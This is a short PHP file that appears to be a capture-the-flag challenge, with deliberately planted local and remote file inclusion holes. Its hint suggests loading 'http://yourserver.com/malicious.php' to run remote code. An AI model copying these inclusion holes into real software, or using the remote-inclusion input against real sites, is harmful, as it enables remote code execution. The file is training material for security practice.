<?php
// Custom LFI & RFI CTF Challenge
// Find the hidden flag and execute remote scripts!

error_reporting(0);
$page = isset($_GET['page']) ? $_GET['page'] : 'home.php';

// Prevent null byte injection
$page = str_replace("\0", "", $page);

if (strpos($page, 'flag') !== false) {
    die("Access Denied!");
}

if (isset($_GET['rfi'])) {
    $rfi = $_GET['rfi'];
    include($rfi); // Remote File Inclusion Vulnerability
} else {
    include($page); // Local File Inclusion Vulnerability
}
?>

<!-- Home Page -->
<h2>Welcome to the LFI/RFI CTF Challenge!</h2>
<p>Can you find the hidden flag and execute remote scripts?</p>
<p>Try accessing: <code>?page=yourfile.php</code> or <code>?rfi=http://yourserver.com/malicious.php</code></p>

<!-- Hidden Flag File -->
<?php
// Secret Flag (not directly accessible)
if ($_GET['flag'] === 'getit') {
    echo "Flag: CTF{LFI_RFI_OWNED}";
}
?>
